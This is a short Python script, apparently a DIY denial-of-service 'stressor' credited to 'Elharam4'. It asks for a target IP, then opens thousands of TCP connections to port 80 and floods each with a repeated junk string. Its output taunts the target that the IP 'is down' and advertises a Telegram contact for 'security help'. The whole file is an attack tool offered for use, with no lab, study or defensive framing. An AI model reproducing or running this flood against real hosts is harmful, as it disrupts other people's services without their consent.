BB = "\033[34;1m" 
YY = "\033[33;1m" 
GG = "\033[32;1m" 
WW = "\033[0;1m"  
RR = "\033[31;1m" 
CC = "\033[36;1m"
B = "\033[34m"    
Y = "\033[33m"   
G = "\033[32m"    
W = "\033[0m"     
R = "\033[31m"   


import socket
print("")
ip=input("ENTER YOUR TARGET or YOUR IP : ");print ("Stress in your target is Running",ip)
for h in range(5000):
  try:
      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
      socket.setdefaulttimeout(1)
      Jmeel=knig.connect((ip,80))
      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*100
      data=data.encode("utf-8")
      knig.send(data)
      print('[√√√] Stress in (ip)',YY,ip,'Stress Using Stressor (Owner : Elharam4) runing ',CC,'port [80]')

  except :
    print(R+"the ip is down with you by My Stressor ",ip,"You Should Up Of Your Security For More Security Help Contact With ME : https://t.me/technologymakers")#   print(C+"no problem in the ip",YY,ip)
